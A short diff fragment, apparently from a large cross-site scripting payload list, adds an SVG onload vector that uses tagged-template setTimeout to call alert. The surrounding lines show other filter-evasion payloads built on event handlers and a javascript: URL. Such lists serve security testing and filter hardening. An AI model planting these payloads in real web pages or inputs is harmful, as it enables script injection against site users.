@@ -2201,3 +2201,4 @@ location='javascript://\u2028alert(1)';
 <frameset/onpageshow=alert(1)> 
 <div onactivate=alert('Xss') id=xss style=overflow:scroll>
 <details open ontoggle=alert(1)>
+<svg/onload=setTimeout`alert\`1\``>
